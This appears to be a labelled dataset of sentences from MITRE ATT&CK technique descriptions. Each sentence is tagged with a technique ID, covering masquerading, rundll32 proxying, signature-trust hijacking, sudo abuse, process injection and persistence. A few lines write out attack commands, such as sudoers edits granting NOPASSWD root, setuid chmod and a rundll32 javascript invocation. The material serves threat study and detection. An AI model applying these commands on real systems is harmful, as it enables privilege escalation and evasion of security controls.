T1036,A JavaScript file named photo_high_re\u202Egnp.js will be displayed as photo_high_resj.png.
T1036,Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type.
T1036,A common use of this technique is with Spearphishing Attachment/Malicious File since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character.
T1036,Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.

T1218,Adversaries may abuse rundll32.exe to proxy execution of malicious code.
T1218,"Using rundll32.exe, vice executing directly  Shared Modules, may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations."
T1218,Rundll32.exe is commonly associated with executing DLL payloads .
T1218,Rundll32.exe can also be used to execute Control Panel Item files  through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser.
T1218,Double-clicking a .cpl file also causes rundll32.exe to execute.
T1218,Rundll32 can also be used to execute scripts such as JavaScript.
T1218,"This can be done using a syntax similar to this: rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write;GetObject""  This behavior has been seen used by malware such as Poweliks."
T1218,Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names.
T1218,"As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function ."

T1553,"Similar to Code Signing, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system."
T1553,"Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious  code as signed by: 
* Modifying the Dll and FuncName Registry values in HKLM\SOFTWARE\WOW6432Node\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID} that point to the dynamic link library  providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file."
T1553,"By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value  rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP  ."
T1553,"* Modifying the Dll and FuncName Registry values in HKLM\SOFTWARE\WOW6432Node\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID} that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value."
T1553,"By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE , an adversary can successfully validate any file  using that SIP  ."
T1553,"This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk."
T1553,"* Modifying the DLL and Function Registry values in HKLM\SOFTWARE\WOW6432Node\Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID} that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made."
T1553,"Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL ."
T1553,* **Note:** The above hijacks are also possible without modifying the Registry via DLL Search Order Hijacking.
T1553,"Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation."

T1499,"Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service."
T1499,"One example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it."
T1499,"This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service."
T1499,"Another variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS."
T1499,The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections.
T1499,"If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm."
T1499,"In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests."
T1499,"Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume."
T1489,Adversaries may stop or disable services on a system to render those services unavailable to legitimate users.
T1489,Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.

T1574,"Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts."
T1574,Windows stores local service configuration information in the Registry under HKLM\SYSTEM\CurrentControlSet\Services.
T1574,"The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  PowerShell, or Reg."
T1574,Access to Registry keys is controlled through access control lists and user permissions.
T1574,"If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control."
T1574,"When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under ."
T1574,Adversaries may also alter other Registry keys in the service’s Registry tree.
T1574,"For example, the FailureCommand key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted."
T1574,The Performance key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.
T1574,"If the Performance key is not already present and if an adversary-controlled user has the Create Subkey permission, adversaries may create the Performance key in the service’s Registry tree to point to a malicious DLL."
T1574,"Adversaries may also add the Parameters key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities."
T1574,"Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\servicename\Parameters\ServiceDll."
T1548,An adversary may perform shell escapes or exploit vulnerabilities in an application with the setsuid or setgid bits to get code running in a different user’s context.
T1548,"On Linux or macOS, when the setuid or setgid bits are set for an application, the application will run with the privileges of the owning user or group respectively. ."
T1548,"Normally an application is run in the current user’s context, regardless of which user or group owns the application."
T1548,"However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges."
T1548,"Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications."
T1548,"These bits are indicated with an ""s"" instead of an ""x"" when viewing a file's attributes via ls -l. The chmod program can set these bits with via bitmasking, chmod 4777 file or via shorthand naming, chmod u+s file."
T1548,Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.. Keydnap adds the setuid flag to a binary so it can easily elevate in the future.
T1548,Exaramel for Linux can execute commands with high privileges via a specific binary with setuid functionality.
T1129,Adversaries may execute malicious payloads via loading shared modules.
T1129,The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention  network paths.
T1129,"This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like CreateProcess, LoadLibrary, etc."
T1129,of the Win32 API.
T1129,"The module loader can load DLLs:
* via specification of the  DLL pathname in the IMPORT directory;
* via EXPORT forwarded to another DLL, specified with  pathname ;
* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;

T1027,Adversaries may perform software packing or virtual machine software protection to conceal their code.
T1027,Software packing is a method of compressing or encrypting an executable.
T1027,Packing an executable changes the file signature in an attempt to avoid signature-based detection.
T1027,Most decompression techniques decompress the executable code in memory.
T1027,Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run.
T1027,A virtual machine is then called to run this code.
T1027,Utilities used to perform software packing are called packers.
T1027,Example packers are MPRESS and UPX.

T1036,Adversaries can hide a program's true filetype by changing the extension of a file.
T1036,"With certain file types , appending a space to the end of a filename will change how the file is processed by the operating system."
T1036,"For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute."
T1036,"If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application ."
T1036,"However, if the file is renamed to evil.txt  , then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed ."
T1036,Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.
T1036,Keydnap puts a space after a false .jpg extension so that execution actually goes through the Terminal.app program.
T1566,Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems.
T1566,Spearphishing attachment is a specific variant of spearphishing.
T1566,Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email.
T1566,"All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry."
T1566,"In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution."
T1566,"Spearphishing may also involve social engineering techniques, such as posing as a trusted source."
T1566,"There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files."
T1566,"Upon opening the attachment , the adversary's payload exploits a vulnerability or directly executes on the user's system."
T1566,"The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so."
T1566,"The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses."
T1566,"Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one."

T1598,These services are more likely to have a less-strict security policy than an enterprise.
T1598,"As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way."
T1598,Adversaries may create fake social media accounts and message employees for potential job opportunities.
T1598,"Doing so allows a plausible reason for asking about services, policies, and information about their environment."
T1566,Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems.
T1566,Spearphishing via service is a specific variant of spearphishing.

T1566,Adversaries will create fake social media accounts and message employees for potential job opportunities.
T1566,"Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment."
T1566,The adversary can then send malicious links or attachments through these services.
T1566,"A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer."
T1566,"This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting."

T1608,These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary  or was otherwise compromised by them .
T1608,"Capabilities can also be staged on web services, such as GitHub or Pastebin."
T1608,"Staging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including :
* Staging web resources necessary to conduct Drive-by Compromise when a user browses to a site."
T1608,* Staging web resources for a link target to be used with spearphishing.

T1037,Adversaries may use startup items automatically executed at boot initialization to establish persistence.
T1037,Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.
T1037,"This is technically a deprecated technology , and thus the appropriate folder, /Library/StartupItems isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra."
T1037,"A startup item is a directory whose executable and configuration property list , StartupParameters.plist, reside in the top-level directory."
T1037,An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism .
T1037,"Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user."
T1037,jRAT can list and manage startup entries.
T1528,Adversaries can steal user application access tokens as a means of acquiring credentials to access remote systems and resources.
T1528,This can occur through social engineering and typically requires user action to grant access.
T1528,An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols.
T1528,An example commonly-used sequence is Microsoft's Authorization Code Grant flow.
T1528,An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials.
T1528,Adversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.
T1528,"The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls."
T1528,"Then, they can send a link through Spearphishing Link to the target user to entice them to grant access to the application."
T1528,"Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through Application Access Token."
T1528,"Adversaries have been seen targeting Gmail, Microsoft Outlook, and Yahoo Mail users."
T1528,"APT28 has used several malicious applications to steal user OAuth access tokens including applications masquerading as ""Google Defender"" ""Google Email Protection,"" and ""Google Scanner"" for Gmail users."
T1528,"They also targeted Yahoo users with applications masquerading as ""Delivery Service"" and ""McAfee Email Protection""."
T1539,An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials.
T1539,Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.
T1539,"Cookies are often valid for an extended period of time, even if the web application is not actively used."
T1539,"Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems."
T1539,"Additionally, other applications on the targets machine might store sensitive authentication cookies in memory ."
T1539,Session cookies can be used to bypasses some multi-factor authentication protocols.
T1539,There are several examples of malware targeting cookies from web browsers on the local system.
T1539,There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a malicious proxy  that can be set up by an adversary and used in phishing campaigns.
T1539,"After an adversary acquires a valid cookie, they can then perform a Web Session Cookie technique to login to the corresponding web application."

T1539,XCSSET uses scp to access the ~/Library/Cookies/Cookies.binarycookies file.
T1539,Evilnum can steal cookies and session information from browsers.
T1558,Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable Pass the Ticket.
T1558,Kerberos is an authentication protocol widely used in modern Windows domain environments.
T1558,"In Kerberos environments, referred to as “realms”, there are three basic participants: client, service, and Key Distribution Center ."
T1558,"Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated."
T1558,The KDC is responsible for both authentication and ticket granting.
T1558,Attackers may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.
T1558,"On Windows, the built-in klist utility can be used to list and analyze cached Kerberos tickets."
T1558,"Linux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the ""ccache""."
T1558,The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.
T1558,"On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon  handles Kerberos tickets."
T1558,By default SSSD maintains a copy of the ticket database that can be found in /var/lib/sss/secrets/secrets.ldb as well as the corresponding key located in /var/lib/sss/secrets/.secrets.mkey.
T1558,Both files require root access to read.
T1558,"If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for Pass the Ticket."
T1558,The ccache file may also be converted into a Windows format using tools such as Kekeo.
T1558,"Kerberos tickets on macOS are stored in a standard ccache format, similar to Linux."
T1558,"By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access."
T1558,The storage location for these ccache entries is influenced by the /etc/krb5.conf configuration file and the KRB5CCNAME environment variable which can specify to save them to disk or keep them protected via the KCM daemon.
T1558,"Users can interact with ticket storage using kinit, klist, ktutil, and kcc built-in binaries or via Apple's native Kerberos framework."
T1558,Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.
T1027,Adversaries may use steganography techniques in order to prevent the detection of hidden information.
T1027,"Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files."
T1027,Duqu was an early example of malware that used steganography.
T1027,It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.
T1027,"By the end of 2017, a threat group used Invoke-PSImage to hide PowerShell commands in an image file  and execute the code on a victim's system."

T1001,Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult.
T1001,Steganographic techniques can be used to hide data in digital messages that are transferred between systems.
T1001,This hidden information can be used for command and control of compromised systems.
T1001,"In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control."
T1001,Daserf can use steganography to hide malicious code downloaded to the victim.
T1001,HAMMERTOSS is controlled via commands that are appended to image files.

T1001,Some malware that has been used by Axiom also uses steganography to hide communication in PNG image files.
T1001,APT29 has used steganography to hide C2 communications in images.
T1565,"Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity."
T1565,"By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making."
T1565,"Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats."
T1565,The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary.
T1565,"SUNSPOT created a copy of the SolarWinds Orion software source file with a .bk extension to backup the original content, wrote SUNBURST using the same filename but with a .tmp extension, and then moved SUNBURST using MoveFileEx to the original filename with a .cs extension so it could be compiled within Orion software."
T1565,"APT38 has used DYEPACK to create, delete, and alter records in databases used for SWIFT transactions."
T1553,Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs.
T1553,Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust.
T1553,"Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site."
T1553,Adversaries may attempt to subvert these trust mechanisms.
T1553,The method adversaries use will depend on the specific mechanism they seek to subvert.
T1553,Adversaries may conduct File and Directory Permissions Modification or Modify Registry in support of subverting these controls.
T1553,Adversaries may also create or steal code signing certificates to acquire trust on target systems.
T1548,Adversaries may perform sudo caching and/or use the suoders file to elevate privileges.
T1548,Adversaries may do this to execute commands as other users or spawn processes with higher privileges.
T1548,"Within Linux and MacOS systems, sudo  allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system."
T1548,"The sudo command ""allows a system administrator to delegate authority to give certain users  the ability to run some  commands as root or another user while providing an audit trail of the commands and their arguments."""
T1548,"Since sudo was made for the system administrator, it has some useful configuration features such as a timestamp_timeout, which is the amount of time in minutes between instances of sudo before it will re-prompt for a password."
T1548,This is because sudo has the ability to cache credentials for a period of time.
T1548,Sudo creates  a file at /var/db/sudo with a timestamp of when sudo was last run to determine this timeout.
T1548,"Additionally, there is a tty_tickets variable that treats each new tty  in isolation."
T1548,"This means that, for example, the sudo timeout of one tty will not affect another tty ."
T1548,"The sudoers file, /etc/sudoers, describes which users can run which commands and from which terminals."
T1548,This also describes which commands users can run as other users or groups.
T1548,"This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password."
T1548,"However, the sudoers file can also specify when to not prompt users for passwords with a line like user1 ALL= NOPASSWD: ALL ."
T1548,Elevated privileges are required to edit this file though.
T1548,Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password.
T1548,"For example, /var/db/sudo's timestamp can be monitored to see if it falls within the timestamp_timeout range."
T1548,"If it does, then malware can execute sudo commands without needing to supply the user's password."
T1548,"Additional, if tty_tickets is disabled, adversaries can do this from any tty for that user."
T1548,"In the wild, malware has disabled tty_tickets to potentially make scripting easier by issuing echo \'Defaults !tty_tickets\' >> /etc/sudoers ."
T1548,"In order for this change to be reflected, the malware also issued killall Terminal."
T1548,"As of macOS Sierra, the sudoers file has tty_tickets enabled by default."
T1548,Proton modifies the tty_tickets line in the sudoers file.
T1548,Cobalt Strike can use sudo to run a command.
T1548,Dok adds admin  ALL= NOPASSWD: ALL to the /etc/sudoers file.
T1195,Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.
T1195,"Supply chain compromise can take place at any stage of the supply chain including:
* Manipulation of development tools
* Manipulation of a development environment
* Manipulation of source code repositories 
* Manipulation of source code in open-source dependencies
* Manipulation of software update/distribution mechanisms
* Compromised/infected system images    
* Replacement of legitimate software with modified versions
* Sales of modified/counterfeit products to legitimate distributors
* Shipment interdiction
While supply chain compromise can impact any component of hardware or software, attackers looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels."
T1195,Targeting may be specific to a desired victim set  or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.
T1195,Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.
T1195,Smoke Loader was distributed through a compromised update to a Tor client with a coin miner payload.
T1195,"NotPetya's initial infection vector for the June 27, 2017 compromise was a backdoor in the Ukrainian tax accounting software M.E.Doc."
T1195,Elderwood has targeted manufacturers in the supply chain for the defense industry.
T1573,Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.

T1543,Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence.
T1543,The systemd service manager is commonly used for managing background daemon processes  and other system resources.
T1543,"Systemd is the default initialization  system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems."
T1543,Systemd utilizes configuration files known as service units to control how services boot and under what conditions.
T1543,"By default, these unit files are stored in the /etc/systemd/system and /usr/lib/systemd/system directories and have the file extension .service."
T1543,"Each service unit file may contain numerous directives that can execute system commands:
* ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start."
T1543,* ExecReload directive covers when a service restarts.
T1543,* ExecStop and ExecStopPost directives cover when a service is stopped or manually by 'systemctl'.
T1543,Adversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at system boot.
T1543,"While adversaries typically require root privileges to create/modify service unit files in the /etc/systemd/system and /usr/lib/systemd/system directories, low privilege users can create/modify service unit files in directories such as ~/.config/systemd/user/ to achieve user-level persistence."
T1543,Fysbis has established persistence using a systemd service.
T1543,Exaramel for Linux has a hardcoded location under systemd that it uses to achieve persistence if it is running as root.
T1543,Hildegard has started a monero service.
T1543,Rocke has installed a systemd service script to maintain persistence.
T1543,TeamTNT has established persistence through the creation of a cryptocurrency mining system service.
T1053,Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code.
T1053,Systemd timers are unit files with file extension .timer that control services.
T1053,Timers can be set to run on a calendar event or after a time span relative to a starting point.
T1053,They can be used as an alternative to Cron in Linux environments.
T1053,"Systemd timers may be activated remotely via the systemctl command line utility, which operates over SSH."
T1053,"Each .timer file must have a corresponding .service file with the same name, e.g., example.timer and example.service."
T1053,.service files are Systemd Service unit files that are managed by the systemd system and service manager.
T1053,Privileged timers are written to /etc/systemd/system/ and /usr/lib/systemd/system while user level are written to ~/.config/systemd/user/.
T1053,An adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.
T1053,Timers installed using privileged paths may be used to maintain root level persistence.
T1053,Adversaries may also install user level timers to achieve user level persistence.
T1542,Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol  server.
T1542,TFTP boot  is commonly used by network administrators to load configuration-controlled network device images from a centralized management server.
T1542,"Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images."
T1542,"Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with Modify System Image to load a modified image on device startup or reset."
T1542,"The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality."
T1542,This technique is similar to ROMMONkit and may result in the network device running a modified image.
T1080,"Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories."
T1080,"Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files."
T1080,"Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system."
T1080,Adversaries may use tainted shared content to move laterally.
T1080,A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory.
T1080,"It uses Shortcut Modification of directory .LNK files that use Masquerading to look like the real directories, which are hidden through Hidden Files and Directories."
T1080,The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs.
T1080,"When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts."
T1080,Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory.
T1080,The malware may modify the original entry point  of the healthy binary to ensure that it is executed before the legitimate code.
T1080,The infection could continue to spread via the newly infected file when it is executed by a remote system.
T1080,"These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS."

T1080,Gamaredon Group has injected malicious macros into all Word and Excel documents on mapped network drives.
T1221,Adversaries may create or modify references in Office document templates to conceal malicious code or force authentication attempts.
T1221,Microsoft’s Office Open XML  specification defines an XML-based format for Office documents  to replace older binary formats .
T1221,"OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered."
T1221,Properties within parts may reference shared public resources accessed via online URLs.
T1221,"For example, template properties reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded."
T1221,Adversaries may abuse this technology to initially conceal malicious code to be executed via documents.
T1221,Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.
T1221,These documents can be delivered via other techniques such as Phishing and/or Taint Shared Content and may evade static detections since no typical indicators  are present until after the malicious payload is fetched.
T1221,Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.
T1221,This technique may also enable Forced Authentication by injecting a SMB/HTTPS  URL and triggering an authentication attempt.
T1221,Chaes changed the template target of the settings.xml file embedded in the Word document and populated that field with the downloaded URL of the next payload.
T1221,Dragonfly 2.0 has injected SMB URLs into malicious Word spearphishing attachments to initiate Forced Authentication.
T1221,"DarkHydrus used an open-source tool, Phishery, to inject malicious remote template URLs into Microsoft Word documents and then sent them to victims to enable Forced Authentication."
T1221,"Tropic Trooper delivered malicious documents with the XLSX extension, typically used by OpenXML documents, but the file itself was actually an OLE  document."

T1221,Frankenstein has used trojanized documents that retrieve remote templates from an adversary-controlled website.
T1221,Gamaredon Group has used DOCX files to download malicious DOT document templates.
T1221,Gamaredon Group can also inject malicious macros or remote templates into documents already present on compromised systems.
T1055,Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges.
T1055,Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process.
T1055,"Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL."
T1055,"At this point the process can be suspended then written to, realigned to the injected code, and resumed via SuspendThread , VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively."
T1055,This is very similar to Process Hollowing but targets an existing process rather than creating a process in a suspended state.
T1055,Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.
T1055,Gazer performs thread execution hijacking to inject its orchestrator into a running thread from a remote process.
T1055,Trojan.Karagany can inject a suspended thread of its own process into a new process and initiate via the ResumeThread API.
T1055,Waterbear can use thread injection to inject shellcode into the process of security software.
T1055,Adversaries may inject malicious code into processes via thread local storage  callbacks in order to evade process-based defenses as well as possibly elevate privileges.
T1055,TLS callback injection is a method of executing arbitrary code in the address space of a separate live process.
T1055,TLS callback injection involves manipulating pointers inside a portable executable  to redirect a process to malicious code before reaching the code's legitimate entry point.
T1055,TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads.
T1055,Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other Process Injection techniques such as Process Hollowing.
T1055,Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.
T1055,Ursnif has injected code into target processes via thread local storage callbacks.
T1597,Adversaries may search private data from threat intelligence vendors for information that can be used during targeting.
T1597,Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported.
T1597,"Although sensitive details  may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures."
T1597,Adversaries may search in private threat intelligence vendor data to gather actionable information.
T1597,"Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns."
T1597,"Information reported by vendors may also reveal opportunities other forms of reconnaissance , establishing operational resources  or Obtain Capabilities, and/or initial access  or External Remote Services."
T1497,Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments.
T1497,"This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment  or sandbox, specifically those that are automated or only operate for a limited amount of time."
T1497,"Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality ."
T1497,Delays may also be based on waiting for specific victim conditions to be met  or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny.
T1497,Benign commands or other operations may also be used to delay malware execution.
T1497,"Loops or otherwise needless repetitions of commands, such as Pings, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments."
T1497,"Another variation, commonly referred to as API hammering, involves making various calls to Native API functions in order to delay execution ."
T1497,"Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time."

T1020,Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised network infrastructure.
T1020,Traffic mirroring is a native feature for some network devices and used for network analysis and may be configured to duplicate traffic and forward to one or more destinations for analysis by a network analyzer or other monitoring device.
T1020,Adversaries may abuse traffic mirroring to mirror or redirect network traffic through other network infrastructure they control.
T1020,Malicious modifications to network devices to enable traffic redirection may be possible through ROMMONkit or Patch System Image.
T1020,"Adversaries may use traffic duplication in conjunction with Network Sniffing, Input Capture, or Adversary-in-the-Middle depending on the goals and objectives of the adversary."
T1205,Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control.
T1205,"Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task."
T1205,This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control.
T1205,"Usually this series of packets consists of attempted connections to a predefined sequence of closed ports  Port Knocking, but can involve unusual flags, specific strings, or other unique characteristics."
T1205,"After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software."
T1205,"Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value."
T1205,"On network devices, adversaries may use crafted packets to enable Network Device Authentication for standard services offered by the device such as telnet."
T1205,"Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities."
T1205,"To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage Patch System Image due to the monolithic nature of the architecture."
T1205,Adversaries may also use the Wake-on-LAN feature to turn on powered off systems.
T1205,"Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it."
